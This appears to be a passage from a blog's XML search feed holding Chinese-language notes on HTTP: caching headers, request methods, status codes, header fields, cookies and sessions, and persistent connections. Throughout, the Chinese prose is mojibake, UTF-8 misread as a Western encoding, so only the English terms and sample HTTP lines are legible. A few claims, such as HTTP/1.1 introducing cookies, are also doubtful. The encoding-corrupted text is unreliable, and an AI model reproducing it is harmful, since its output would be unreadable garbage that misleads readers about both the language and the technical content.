‡è¯†ã€‚ç¬¬ä¸€æ¬¡è¯·æ±‚ä¹‹åŽï¼Œæµè§ˆå™¨è®°å½•è¿™ä¸ªæ—¶é—´ï¼Œå†æ¬¡è¯·æ±‚æ—¶ï¼Œè¯·æ±‚å¤´å¸¦ä¸ŠIf-Modified-Sinceå³ä¸ºä¹‹å‰è®°å½•ä¸‹çš„æ—¶é—´ã€‚æœåŠ¡å™¨ç«¯æ”¶åˆ°å¸¦If-Modified-Sinceçš„è¯·æ±‚åŽä¼šåŽ»å’Œèµ„æºæœ€åŽä¿®æ”¹æ—¶é—´å¯¹æ¯”ã€‚è‹¥ä¿®æ”¹è¿‡å°±è¿”å›žæœ€æ–°èµ„æºï¼ŒçŠ¶æ€ç 200ï¼Œå¦åˆ™æ²¡æœ‰ä¿®æ”¹è¿‡è¿”å›ž304ã€‚ ==æ³¨æ„ï¼šå¦‚æžœå“åº”å¤´ä¸­æœ‰Last-modifiedè€Œæ²¡æœ‰Expireæˆ–Chache-Controlï¼Œæµè§ˆå™¨ä¼šæœ‰è‡ªå·±çš„ç®—æ³•ç®—å‡ºï¼Œä¸åŒæµè§ˆå™¨ç®—å‡ºæ—¶é—´ä¸ä¸€æ ·ï¼Œæ‰€æœ‰Last-modifiedè¦é…åˆExpires/Cache-Controlä½¿ç”¨== Etag/If-None-Matchç”±æœåŠ¡å™¨ç«¯ä¸Šç”Ÿæˆä¸€æ®µhashå­—ç¬¦ä¸²ï¼Œç¬¬ä¸€æ¬¡è¯·æ±‚æ—¶å“åº”å¤´å¸¦ä¸ŠETag:abcdï¼Œä¹‹åŽçš„è¯·æ±‚ä¸­å¸¦ä¸ŠIf-None-Match: abcdï¼ŒæœåŠ¡å™¨æ£€æŸ¥ETagï¼Œè¿”å›ž304æˆ–200 é€‰æ‹©Chech-Controlç­–ç•¥]]></content>
      <categories>
        <category>å…¶å®ƒ</category>
      </categories>
      <tags>
        <tag>ç¼“å­˜</tag>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTPåè®®æ€»ç»“ï¼ˆæ•´ç†ç‰ˆï¼‰]]></title>
    <url>%2F2018%2F04%2F11%2FHTTP%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93%EF%BC%88%E6%95%B4%E7%90%86%E7%89%88%EF%BC%89%2F</url>
    <content type="text"><![CDATA[ä¸€ã€åŸºæœ¬æ¦‚å¿µ1.1 webåŸºç¡€ HTTPï¼ˆHyperText Transfer Protocolï¼‰ï¼šè¶…æ–‡æœ¬ä¼ è¾“åè®®ã€‚ WWWï¼ˆWorld Wide Webï¼‰çš„ä¸‰ç§æŠ€æœ¯ï¼šHTMLã€HTTPã€URLã€‚ RFCï¼ˆRequest for Commentsï¼‰ï¼šå¾æ±‚ä¿®æ­£æ„è§ä¹¦ï¼Œäº’è”ç½‘çš„è®¾è®¡æ–‡æ¡£ã€‚ 1.2 URL URIï¼ˆUniform Resource Indentifierï¼‰ï¼šç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ã€‚ URLï¼ˆUniform Resource Locatorï¼‰ï¼šç»Ÿä¸€èµ„æºå®šä½ç¬¦ã€‚ URNï¼ˆUniform Resource Nameï¼‰ï¼šç»Ÿä¸€èµ„æºåç§°ã€‚ ps:URI åŒ…å« URL å’Œ URNï¼Œç›®å‰ WEB åªæœ‰ URL æ¯”è¾ƒæµè¡Œï¼Œæ‰€ä»¥è§åˆ°çš„åŸºæœ¬éƒ½æ˜¯ URLã€‚ 1.3 è¯·æ±‚å’Œå“åº”æŠ¥æ–‡1.3.1 è¯·æ±‚æŠ¥æ–‡ 1.3.2 å“åº”æŠ¥æ–‡ äºŒã€HTTPæ–¹æ³•å®¢æˆ·ç«¯å‘é€çš„ è¯·æ±‚æŠ¥æ–‡ ç¬¬ä¸€è¡Œä¸ºè¯·æ±‚è¡Œï¼ŒåŒ…å«äº†æ–¹æ³•å­—æ®µã€‚ 2.1 GETèŽ·å–èµ„æº å½“å‰ç½‘ç»œè¯·æ±‚ä¸­ï¼Œç»å¤§éƒ¨åˆ†ä½¿ç”¨çš„æ˜¯ GET æ–¹æ³•ã€‚ 2.2 HEADèŽ·å–æŠ¥æ–‡é¦–éƒ¨ å’Œ GET æ–¹æ³•ä¸€æ ·ï¼Œä½†æ˜¯ä¸è¿”å›žæŠ¥æ–‡å®žä½“ä¸»ä½“éƒ¨åˆ†ã€‚ ä¸»è¦ç”¨äºŽç¡®è®¤ URL çš„æœ‰æ•ˆæ€§ä»¥åŠèµ„æºæ›´æ–°çš„æ—¥æœŸæ—¶é—´ç­‰ã€‚ 2.3 POSTä¼ è¾“å®žä½“ä¸»ä½“ POSTä¸»è¦ç”¨æ¥ä¼ è¾“æ•°æ®ï¼Œè€ŒGETä¸»è¦ç”¨æ¥èŽ·å–èµ„æºã€‚ 2.4 PUTä¸Šä¼ æ–‡ä»¶ ç”±äºŽè‡ªèº«ä¸å¸¦éªŒè¯æœºåˆ¶ï¼Œä»»ä½•äººéƒ½å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œå› æ­¤å­˜åœ¨å®‰å…¨æ€§é—®é¢˜ï¼Œä¸€èˆ¬ä¸ä½¿ç”¨è¯¥æ–¹æ³•ã€‚ 2.5 PATCHå¯¹èµ„æºè¿›è¡Œéƒ¨åˆ†ä¿®æ”¹ PUTä¹Ÿå¯ä»¥ç”¨äºŽä¿®æ”¹èµ„æºï¼Œä½†æ˜¯åªèƒ½å®Œå…¨æ›¿ä»£åŽŸå§‹èµ„æºï¼ŒPATCHå…è®¸éƒ¨åˆ†ä¿®æ”¹ã€‚ 2.6 DELETEåˆ é™¤æ–‡ä»¶ ä¸ŽPUTåŠŸèƒ½ç›¸åï¼Œå¹¶ä¸”åŒæ ·ä¸å¸¦éªŒè¯æœºåˆ¶ã€‚ 2.7 OPTIONSæŸ¥è¯¢æ”¯æŒçš„æ–¹æ³• æŸ¥è¯¢æŒ‡å®šçš„URLèƒ½å¤Ÿæ”¯æŒçš„æ–¹æ³•ã€‚è¿”å›žAllow:GET,POST,HEAD,OPTIONSè¿™æ ·çš„å†…å®¹ã€‚ 2.8 CONNECTè¦æ±‚ç”¨éš§é“åè®®è¿žæŽ¥ä»£ç† è¦æ±‚åœ¨ä¸Žä»£ç†æœåŠ¡å™¨é€šä¿¡æ—¶å»ºç«‹éš§é“ï¼Œä½¿ç”¨ SSLï¼ˆSecure Sockets Layerï¼Œå®‰å…¨å¥—æŽ¥å±‚ï¼‰å’Œ TLSï¼ˆTransport Layer Securityï¼Œä¼ è¾“å±‚å®‰å…¨ï¼‰åè®®æŠŠé€šä¿¡å†…å®¹åŠ å¯†åŽç»ç½‘ç»œéš§é“ä¼ è¾“ã€‚ 2.9 TRACEè¿½è¸ªè·¯å¾„ æœåŠ¡å™¨ä¼šå°†é€šä¿¡è·¯å¾„è¿”å›žç»™å®¢æˆ·ç«¯ã€‚ å‘é€è¯·æ±‚æ—¶ï¼Œåœ¨ Max-Forwards é¦–éƒ¨å­—æ®µä¸­å¡«å…¥æ•°å€¼ï¼Œæ¯ç»è¿‡ä¸€ä¸ªæœåŠ¡å™¨å°±ä¼šå‡ 1ï¼Œå½“æ•°å€¼ä¸º 0 æ—¶å°±åœæ­¢ä¼ è¾“ã€‚ é€šå¸¸ä¸ä¼šä½¿ç”¨ TRACEï¼Œå¹¶ä¸”å®ƒå®¹æ˜“å—åˆ° XST æ”»å‡»ï¼ˆCross-Site Tracingï¼Œè·¨ç«™è¿½è¸ªï¼‰ï¼Œå› æ­¤æ›´ä¸ä¼šåŽ»ä½¿ç”¨å®ƒã€‚ ä¸‰ã€HTTPçŠ¶æ€ç æœåŠ¡å™¨è¿”å›žçš„ å“åº”æŠ¥æ–‡ ä¸­ç¬¬ä¸€è¡Œä¸ºçŠ¶æ€è¡Œï¼ŒåŒ…å«äº†çŠ¶æ€ç ä»¥åŠåŽŸå› çŸ­è¯­ï¼Œç”¨æ¥å‘ŠçŸ¥å®¢æˆ·ç«¯è¯·æ±‚çš„ç»“æžœã€‚ çŠ¶æ€ç  ç±»åˆ« è§£é‡Š 1xx Informationalï¼ˆä¿¡æ¯æ€§çŠ¶æ€ç ï¼‰ æŽ¥æ”¶çš„è¯·æ±‚æ­£åœ¨å¤„ç† 2xx Successï¼ˆæˆåŠŸçŠ¶æ€ç ï¼‰ è¯·æ±‚æ­£å¸¸å¤„ç†å®Œæ¯• 3xx Redirectionï¼ˆé‡å®šå‘çŠ¶æ€ç ï¼‰ éœ€è¦è¿›è¡Œé™„åŠ æ“ä½œä»¥å®Œæˆè¯·æ±‚ 4xx Client Errorï¼ˆå®¢æˆ·ç«¯é”™è¯¯çŠ¶æ€ç ï¼‰ æœåŠ¡å™¨æ— æ³•å¤„ç†è¯·æ±‚ 5xx Server Errorï¼ˆæœåŠ¡å™¨é”™è¯¯çŠ¶æ€ç ï¼‰ æœåŠ¡å™¨å¤„ç†è¯·æ±‚å‡ºé”™ 3.1 1xxä¿¡æ¯ 100 Continue ï¼šè¡¨æ˜Žåˆ°ç›®å‰ä¸ºæ­¢éƒ½å¾ˆæ­£å¸¸ï¼Œå®¢æˆ·ç«¯å¯ä»¥ç»§ç»­å‘é€è¯·æ±‚æˆ–è€…å¿½ç•¥è¿™ä¸ªå“åº”ã€‚ 3.2 2xxæˆåŠŸ 200 OKï¼šè¯·æ±‚æˆåŠŸå¹¶è¿”å›žã€‚ 204 No Contentï¼šè¯·æ±‚å·²ç»æˆåŠŸå¤„ç†ï¼Œä½†æ˜¯è¿”å›žçš„å“åº”æŠ¥æ–‡ä¸åŒ…å«å®žä½“çš„ä¸»ä½“éƒ¨åˆ†ã€‚ä¸€èˆ¬åœ¨åªéœ€è¦ä»Žå®¢æˆ·ç«¯å¾€æœåŠ¡å™¨å‘é€ä¿¡æ¯ï¼Œè€Œä¸éœ€è¦è¿”å›žæ•°æ®æ—¶ä½¿ç”¨ã€‚ 206 Partial Contentï¼šè¡¨ç¤ºå®¢æˆ·ç«¯è¿›è¡Œäº†èŒƒå›´è¯·æ±‚ã€‚å“åº”æŠ¥æ–‡åŒ…å«ç”± Content-Range æŒ‡å®šèŒƒå›´çš„å®žä½“å†…å®¹ã€‚ 3.3 3xxé‡å®šå‘ 301 Moved Permanentlyï¼šæ°¸ä¹…æ€§é‡å®šå‘ã€‚ 302 Foundï¼šä¸´æ—¶æ€§é‡å®šå‘ã€‚ 303 See Otherï¼šå’Œ 302 æœ‰ç€ç›¸åŒçš„åŠŸèƒ½ï¼Œä½†æ˜¯ 303 æ˜Žç¡®è¦æ±‚å®¢æˆ·ç«¯åº”è¯¥é‡‡ç”¨ GET æ–¹æ³•èŽ·å–èµ„æºã€‚PSï¼šè™½ç„¶ HTTP åè®®è§„å®š 301ã€302 çŠ¶æ€ä¸‹é‡å®šå‘æ—¶ä¸å…è®¸æŠŠ POST æ–¹æ³•æ”¹æˆ GET æ–¹æ³•ï¼Œä½†æ˜¯å¤§å¤šæ•°æµè§ˆå™¨éƒ½ä¼šåœ¨ 301ã€302 å’Œ 303 çŠ¶æ€ä¸‹çš„é‡å®šå‘æŠŠ POST æ–¹æ³•æ”¹æˆ GET æ–¹æ³•ã€‚ 304 Not Modifiedï¼šå¦‚æžœè¯·æ±‚æŠ¥æ–‡é¦–éƒ¨åŒ…å«ä¸€äº›æ¡ä»¶ï¼Œä¾‹å¦‚ï¼šIf-Matchï¼ŒIf-ModifiedSinceï¼ŒIf-None-Matchï¼ŒIf-Rangeï¼ŒIf-Unmodified-Sinceï¼Œå¦‚æžœä¸æ»¡è¶³æ¡ä»¶ï¼Œåˆ™æœåŠ¡å™¨ä¼šè¿”å›ž 304 çŠ¶æ€ç ã€‚ 307 Temporary Redirectï¼šä¸´æ—¶é‡å®šå‘ï¼Œä¸Ž 302 çš„å«ä¹‰ç±»ä¼¼ï¼Œä½†æ˜¯ 307 è¦æ±‚æµè§ˆå™¨ä¸ä¼šæŠŠé‡å®šå‘è¯·æ±‚çš„ POST æ–¹æ³•æ”¹æˆ GET æ–¹æ³•ã€‚ 3.4 4xxå®¢æˆ·ç«¯é”™è¯¯ 400 Bad Requestï¼šè¯·æ±‚æŠ¥æ–‡ä¸­å­˜åœ¨è¯­æ³•é”™è¯¯ã€‚ 401 Unauthorizedï¼šè¯¥çŠ¶æ€ç è¡¨ç¤ºå‘é€çš„è¯·æ±‚éœ€è¦æœ‰è®¤è¯ä¿¡æ¯ï¼ˆBASIC è®¤è¯ã€DIGEST è®¤è¯ï¼‰ã€‚å¦‚æžœä¹‹å‰å·²è¿›è¡Œè¿‡ä¸€æ¬¡è¯·æ±‚ï¼Œåˆ™è¡¨ç¤ºç”¨æˆ·è®¤è¯å¤±è´¥ã€‚ 403 Forbiddenï¼šè¯·æ±‚è¢«æ‹’ç»ï¼ŒæœåŠ¡å™¨ç«¯æ²¡æœ‰å¿…è¦ç»™å‡ºæ‹’ç»çš„è¯¦ç»†ç†ç”±ã€‚ 404 Not Foundï¼šæœªæ‰¾åˆ°å®¢æˆ·ç«¯è¦è¯·æ±‚çš„èµ„æºã€‚ 3.5 5xxæœåŠ¡å™¨é”™è¯¯ 500 Internal Server Errorï¼šæœåŠ¡å™¨æ­£åœ¨æ‰§è¡Œè¯·æ±‚æ—¶å‘ç”Ÿé”™è¯¯ã€‚ 503 Service Unavilable ï¼šæœåŠ¡å™¨æš‚æ—¶å¤„äºŽè¶…è´Ÿè½½æˆ–æ­£åœ¨è¿›è¡Œåœæœºç»´æŠ¤ï¼ŒçŽ°åœ¨æ— æ³•å¤„ç†è¯·æ±‚ã€‚ å››ã€HTTPé¦–éƒ¨æœ‰ 4 ç§ç±»åž‹çš„é¦–éƒ¨å­—æ®µï¼šé€šç”¨é¦–éƒ¨å­—æ®µã€è¯·æ±‚é¦–éƒ¨å­—æ®µã€å“åº”é¦–éƒ¨å­—æ®µå’Œå®žä½“é¦–éƒ¨å­—æ®µ 4.1 é€šç”¨é¦–éƒ¨å­—æ®µ é¦–éƒ¨å­—æ®µå è¯´æ˜Ž Cache-Control æŽ§åˆ¶ç¼“å­˜çš„è¡Œä¸º Connection æŽ§åˆ¶ä¸å†è½¬å‘ç»™ä»£ç†çš„é¦–éƒ¨å­—æ®µã€ç®¡ç†æŒä¹…è¿žæŽ¥ Date åˆ›å»ºæŠ¥æ–‡çš„æ—¥æœŸæ—¶é—´ Pragma æŠ¥æ–‡æŒ‡ä»¤ Trailer æŠ¥æ–‡æœ«ç«¯çš„é¦–éƒ¨ä¸€è§ˆ Transfer-Encoding æŒ‡å®šæŠ¥æ–‡ä¸»ä½“çš„ä¼ è¾“ç¼–ç æ–¹å¼ Upgrade å‡çº§ä¸ºå…¶ä»–åè®® Via ä»£ç†æœåŠ¡å™¨çš„ç›¸å…³ä¿¡æ¯ Warning é”™è¯¯é€šçŸ¥ 4.2 è¯·æ±‚é¦–éƒ¨å­—æ®µ é¦–éƒ¨å­—æ®µå è¯´æ˜Ž Accept ç”¨æˆ·ä»£ç†å¯å¤„ç†çš„åª’ä½“ç±»åž‹ Accept-Charset ä¼˜å…ˆçš„å­—ç¬¦é›† Accept-Encoding ä¼˜å…ˆçš„å†…å®¹ç¼–ç  Accept-Language ä¼˜å…ˆçš„è¯­è¨€ï¼ˆè‡ªç„¶è¯­è¨€ï¼‰ Authorization Web è®¤è¯ä¿¡æ¯ Expect æœŸå¾…æœåŠ¡å™¨çš„ç‰¹å®šè¡Œä¸º From ç”¨æˆ·çš„ç”µå­é‚®ç®±åœ°å€ Host è¯·æ±‚èµ„æºæ‰€åœ¨æœåŠ¡å™¨ If-Match æ¯”è¾ƒå®žä½“æ ‡è®°ï¼ˆETagï¼‰ If-Modified-Since æ¯”è¾ƒèµ„æºçš„æ›´æ–°æ—¶é—´ If-None-Match æ¯”è¾ƒå®žä½“æ ‡è®°ï¼ˆä¸Ž If-Match ç›¸åï¼‰ If-Range èµ„æºæœªæ›´æ–°æ—¶å‘é€å®žä½“ Byte çš„èŒƒå›´è¯·æ±‚ If-Unmodified-Since æ¯”è¾ƒèµ„æºçš„æ›´æ–°æ—¶é—´ï¼ˆä¸Ž If-Modified-Sinceç›¸åï¼‰ Max-Forwards æœ€å¤§ä¼ è¾“é€è·³æ•° Proxy-Authorization ä»£ç†æœåŠ¡å™¨è¦æ±‚å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯ Range å®žä½“çš„å­—èŠ‚èŒƒå›´è¯·æ±‚ Referer å¯¹è¯·æ±‚ä¸­ URI çš„åŽŸå§‹èŽ·å–æ–¹ TE ä¼ è¾“ç¼–ç çš„ä¼˜å…ˆçº§ User-Agent HTTP å®¢æˆ·ç«¯ç¨‹åºçš„ä¿¡æ¯ 4.3 å“åº”é¦–éƒ¨å­—æ®µ é¦–éƒ¨å­—æ®µå è¯´æ˜Ž Accept-Ranges æ˜¯å¦æŽ¥å—å­—èŠ‚èŒƒå›´è¯·æ±‚ Age æŽ¨ç®—èµ„æºåˆ›å»ºç»è¿‡æ—¶é—´ ETag èµ„æºçš„åŒ¹é…ä¿¡æ¯ Location ä»¤å®¢æˆ·ç«¯é‡å®šå‘è‡³æŒ‡å®š URI Proxy-Authenticate ä»£ç†æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯ Retry-After å¯¹å†æ¬¡å‘èµ·è¯·æ±‚çš„æ—¶æœºè¦æ±‚ Server HTTP æœåŠ¡å™¨çš„å®‰è£…ä¿¡æ¯ Vary ä»£ç†æœåŠ¡å™¨ç¼“å­˜çš„ç®¡ç†ä¿¡æ¯ WWW-Authenticate æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯ 4.4 å®žä½“é¦–éƒ¨å­—æ®µ é¦–éƒ¨å­—æ®µå è¯´æ˜Ž Allow èµ„æºå¯æ”¯æŒçš„ HTTPæ–¹æ³• Content-Encoding å®žä½“ä¸»ä½“é€‚ç”¨çš„ç¼–ç æ–¹å¼ Content-Language å®žä½“ä¸»ä½“çš„è‡ªç„¶è¯­è¨€ Content-Length å®žä½“ä¸»ä½“çš„å¤§å° Content-Location æ›¿ä»£å¯¹åº”èµ„æºçš„ URI Content-MD5 å®žä½“ä¸»ä½“çš„æŠ¥æ–‡æ‘˜è¦ Content-Range å®žä½“ä¸»ä½“çš„ä½ç½®èŒƒå›´ Content-Type å®žä½“ä¸»ä½“çš„åª’ä½“ç±»åž‹ Expires å®žä½“ä¸»ä½“è¿‡æœŸçš„æ—¥æœŸæ—¶é—´ Last-Modified èµ„æºçš„æœ€åŽä¿®æ”¹æ—¥æœŸæ—¶é—´ äº”ã€å…·ä½“åº”ç”¨5.1 Cookie HTTP åè®®æ˜¯æ— çŠ¶æ€çš„ï¼Œä¸»è¦æ˜¯ä¸ºäº†è®© HTTP åè®®å°½å¯èƒ½ç®€å•ï¼Œä½¿å¾—å®ƒèƒ½å¤Ÿå¤„ç†å¤§é‡äº‹åŠ¡ã€‚HTTP/1.1 å¼•å…¥ Cookie æ¥ä¿å­˜çŠ¶æ€ä¿¡æ¯ã€‚ Cookie æ˜¯æœåŠ¡å™¨å‘é€ç»™å®¢æˆ·ç«¯çš„æ•°æ®ï¼Œè¯¥æ•°æ®ä¼šè¢«ä¿å­˜åœ¨æµè§ˆå™¨ä¸­ï¼Œå¹¶ä¸”å®¢æˆ·ç«¯çš„ä¸‹ä¸€æ¬¡è¯·æ±‚æŠ¥æ–‡ä¼šåŒ…å«è¯¥æ•°æ®ã€‚é€šè¿‡ Cookie å¯ä»¥è®©æœåŠ¡å™¨çŸ¥é“ä¸¤ä¸ªè¯·æ±‚æ˜¯å¦æ¥è‡ªäºŽåŒä¸€ä¸ªå®¢æˆ·ç«¯ï¼Œä»Žè€Œå®žçŽ°ä¿æŒç™»å½•çŠ¶æ€ç­‰åŠŸèƒ½ã€‚ 5.1.1 åˆ›å»ºè¿‡ç¨‹ æœåŠ¡å™¨å‘é€çš„å“åº”æŠ¥æ–‡åŒ…å« Set-Cookie å­—æ®µï¼Œå®¢æˆ·ç«¯å¾—åˆ°å“åº”æŠ¥æ–‡åŽæŠŠ Cookie å†…å®¹ä¿å­˜åˆ°æµè§ˆå™¨ä¸­ã€‚ 123456HTTP/1.0 200 OKContent-type: text/htmlSet-Cookie: yummy_cookie=chocoSet-Cookie: tasty_cookie=strawberry[page content] å®¢æˆ·ç«¯ä¹‹åŽå‘é€è¯·æ±‚æ—¶ï¼Œä¼šä»Žæµè§ˆå™¨ä¸­è¯»å‡º Cookie å€¼ï¼Œåœ¨è¯·æ±‚æŠ¥æ–‡ä¸­åŒ…å« Cookie å­—æ®µã€‚ 123GET /sample_page.html HTTP/1.1Host: www.example.orgCookie: yummy_cookie=choco; tasty_cookie=strawberry 5.1.2 åˆ†ç±» ä¼šè¯æœŸ Cookieï¼šæµè§ˆå™¨å…³é—­ä¹‹åŽå®ƒä¼šè¢«è‡ªåŠ¨åˆ é™¤ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä»…åœ¨ä¼šè¯æœŸå†…æœ‰æ•ˆã€‚ æŒä¹…æ€§ Cookieï¼šæŒ‡å®šä¸€ä¸ªç‰¹å®šçš„è¿‡æœŸæ—¶é—´ï¼ˆExpiresï¼‰æˆ–æœ‰æ•ˆæœŸï¼ˆMax-Ageï¼‰ä¹‹åŽå°±æˆä¸ºäº†æŒä¹…æ€§çš„ Cookieã€‚ 1Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; 5.1.3 Set-Cookie å±žæ€§ è¯´æ˜Ž NAME=VALUE èµ‹äºˆ Cookie çš„åç§°å’Œå…¶å€¼ï¼ˆå¿…éœ€é¡¹ï¼‰ expires=DATE Cookie çš„æœ‰æ•ˆæœŸï¼ˆè‹¥ä¸æ˜Žç¡®æŒ‡å®šåˆ™é»˜è®¤ä¸ºæµè§ˆå™¨å…³é—­å‰ä¸ºæ­¢ï¼‰ path=PATH å°†æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ç›®å½•ä½œä¸º Cookie çš„é€‚ç”¨å¯¹è±¡ï¼ˆè‹¥ä¸æŒ‡å®šåˆ™é»˜è®¤ä¸ºæ–‡æ¡£æ‰€åœ¨çš„æ–‡ä»¶ç›®å½•ï¼‰ domain=åŸŸå ä½œä¸º Cookie é€‚ç”¨å¯¹è±¡çš„åŸŸåï¼ˆè‹¥ä¸æŒ‡å®šåˆ™é»˜è®¤ä¸ºåˆ›å»º Cookie çš„æœåŠ¡å™¨çš„åŸŸåï¼‰ Secure ä»…åœ¨ HTTPs å®‰å…¨é€šä¿¡æ—¶æ‰ä¼šå‘é€ Cookie HttpOnly åŠ ä»¥é™åˆ¶ï¼Œä½¿ Cookie ä¸èƒ½è¢« JavaScript è„šæœ¬è®¿é—® 5.1.4 Sessionå’ŒCookieåŒºåˆ«Session æ˜¯æœåŠ¡å™¨ç”¨æ¥è·Ÿè¸ªç”¨æˆ·çš„ä¸€ç§æ‰‹æ®µï¼Œæ¯ä¸ª Session éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€æ ‡è¯†ï¼šSession IDã€‚å½“æœåŠ¡å™¨åˆ›å»ºäº†ä¸€ä¸ª Session æ—¶ï¼Œç»™å®¢æˆ·ç«¯å‘é€çš„å“åº”æŠ¥æ–‡åŒ…å«äº† Set-Cookie å­—æ®µï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªåä¸º sid çš„é”®å€¼å¯¹ï¼Œè¿™ä¸ªé”®å€¼å¯¹å°±æ˜¯ Session IDã€‚å®¢æˆ·ç«¯æ”¶åˆ°åŽå°±æŠŠ Cookie ä¿å­˜åœ¨æµè§ˆå™¨ä¸­ï¼Œå¹¶ä¸”ä¹‹åŽå‘é€çš„è¯·æ±‚æŠ¥æ–‡éƒ½åŒ…å« Session IDã€‚HTTP å°±æ˜¯é€šè¿‡ Session å’Œ Cookie è¿™ä¸¤ç§æ–¹å¼ä¸€èµ·åˆä½œæ¥å®žçŽ°è·Ÿè¸ªç”¨æˆ·çŠ¶æ€çš„ï¼ŒSession ç”¨äºŽæœåŠ¡å™¨ç«¯ï¼ŒCookie ç”¨äºŽå®¢æˆ·ç«¯ã€‚ 5.1.5 æµè§ˆå™¨ç¦ç”¨Cookieçš„æƒ…å†µä¼šä½¿ç”¨URLé‡å†™æŠ€æœ¯ï¼Œåœ¨URLåŽé¢è¿½ç¼´sid=xxxã€‚ 5.1.6 ä½¿ç”¨ Cookie å®žçŽ°ç”¨æˆ·åå’Œå¯†ç çš„è‡ªåŠ¨å¡«å†™ ç½‘ç«™è„šæœ¬ä¼šè‡ªåŠ¨ä»Žä¿å­˜åœ¨æµè§ˆå™¨ä¸­çš„ Cookie è¯»å–ç”¨æˆ·åå’Œå¯†ç ï¼Œä»Žè€Œå®žçŽ°è‡ªåŠ¨å¡«å†™ã€‚-ä½†æ˜¯å¦‚æžœ Set-Cookie æŒ‡å®šäº† HttpOnlyå±žæ€§ï¼Œå°±æ— æ³•é€šè¿‡ Javascriptè„šæœ¬èŽ·å– Cookieä¿¡æ¯ï¼Œè¿™æ˜¯å‡ºäºŽå®‰å…¨æ€§è€ƒè™‘ã€‚ 5.2 ç¼“å­˜5.2.1 ä¼˜ç‚¹ é™ä½ŽæœåŠ¡å™¨çš„è´Ÿæ‹…ã€‚ æé«˜å“åº”é€Ÿåº¦ã€‚ï¼ˆç¼“å­˜èµ„æºæ¯”æœåŠ¡å™¨ä¸Šçš„èµ„æºç¦»å®¢æˆ·ç«¯æ›´è¿‘ï¼‰ 5.2.2 å®žçŽ°æ–¹æ³• è®©ä»£ç†æœåŠ¡å™¨è¿›è¡Œç¼“å­˜ã€‚ è®©å®¢æˆ·ç«¯æµè§ˆå™¨è¿›è¡Œç¼“å­˜ã€‚ 5.2.3 Cache-Control å­—æ®µ HTTP é€šè¿‡ Cache-Control é¦–éƒ¨å­—æ®µæ¥æŽ§åˆ¶ç¼“å­˜ã€‚ 1Cache-Control: private, max-age=0, no-cache 5.2.4 no-cache æŒ‡ä»¤ è¯¥æŒ‡ä»¤å‡ºçŽ°åœ¨è¯·æ±‚æŠ¥æ–‡çš„ Cache-Control å­—æ®µä¸­ï¼Œè¡¨ç¤ºç¼“å­˜æœåŠ¡å™¨éœ€è¦å…ˆå‘åŽŸæœåŠ¡å™¨éªŒè¯ç¼“å­˜èµ„æºæ˜¯å¦è¿‡æœŸ è¯¥æŒ‡ä»¤å‡ºçŽ°åœ¨å“åº”æŠ¥æ–‡çš„ Cache-Control å­—æ®µä¸­ï¼Œè¡¨ç¤ºç¼“å­˜æœåŠ¡å™¨åœ¨è¿›è¡Œç¼“å­˜ä¹‹å‰éœ€è¦å…ˆéªŒè¯ç¼“å­˜èµ„æºçš„æœ‰æ•ˆæ€§ 5.2.5 no-store æŒ‡ä»¤ è¯¥æŒ‡ä»¤è¡¨ç¤ºç¼“å­˜æœåŠ¡å™¨ä¸èƒ½å¯¹è¯·æ±‚æˆ–å“åº”çš„ä»»ä½•ä¸€éƒ¨åˆ†è¿›è¡Œç¼“å­˜ã€‚ no-cache ä¸è¡¨ç¤ºä¸ç¼“å­˜ï¼Œè€Œæ˜¯ç¼“å­˜ä¹‹å‰éœ€è¦å…ˆè¿›è¡ŒéªŒè¯ï¼Œno-store æ‰æ˜¯ä¸è¿›è¡Œç¼“å­˜ã€‚ 5.2.6 max-age æŒ‡ä»¤ è¯¥æŒ‡ä»¤å‡ºçŽ°åœ¨è¯·æ±‚æŠ¥æ–‡çš„ Cache-Control å­—æ®µä¸­ï¼Œå¦‚æžœç¼“å­˜èµ„æºçš„ç¼“å­˜æ—¶é—´å°äºŽè¯¥æŒ‡ä»¤æŒ‡å®šçš„æ—¶é—´ï¼Œé‚£ä¹ˆå°±èƒ½æŽ¥å—è¯¥ç¼“å­˜ã€‚ è¯¥æŒ‡ä»¤å‡ºçŽ°åœ¨å“åº”æŠ¥æ–‡çš„ Cache-Control å­—æ®µä¸­ï¼Œè¡¨ç¤ºç¼“å­˜èµ„æºåœ¨ç¼“å­˜æœåŠ¡å™¨ä¸­ä¿å­˜çš„æ—¶é—´ã€‚ Expires å­—æ®µä¹Ÿå¯ä»¥ç”¨äºŽå‘ŠçŸ¥ç¼“å­˜æœåŠ¡å™¨è¯¥èµ„æºä»€ä¹ˆæ—¶å€™ä¼šè¿‡æœŸã€‚åœ¨ HTTP/1.1ä¸­ï¼Œä¼šä¼˜å…ˆå¤„ç† Cache-Control : max-age æŒ‡ä»¤ï¼›è€Œåœ¨ HTTP/1.0 ä¸­ï¼ŒCache-Control : max-age æŒ‡ä»¤ä¼šè¢«å¿½ç•¥æŽ‰ã€‚ 5.3 æŒä¹…åŒ–è¿žæŽ¥å½“æµè§ˆå™¨è®¿é—®ä¸€ä¸ªåŒ…å«å¤šå¼ å›¾ç‰‡çš„HTMLé¡µé¢æ—¶ï¼Œé™¤äº†è¯·æ±‚è®¿é—®HTMLé¡µé¢èµ„æºï¼Œä¼šè¯·æ±‚å›¾ç‰‡èµ„æºï¼Œå¦‚æžœæ¯è¿›è¡Œä¾æ¬¡HTTPé€šä¿¡å°±è¦æ–­å¼€ä¸€æ¬¡TCPè¿žæŽ¥ï¼Œè¿žæŽ¥å»ºç«‹å’Œæ–­å¼€çš„å¼€é”€ä¼šå¾ˆå¤§ã€‚æŒä¹…åŒ–è¿žæŽ¥åªéœ€è¦å»ºç«‹ä¸€æ¬¡TCPè¿žæŽ¥å°±èƒ½è¿›è¡Œå¤šæ¬¡HTTPé€šä¿¡ã€‚ 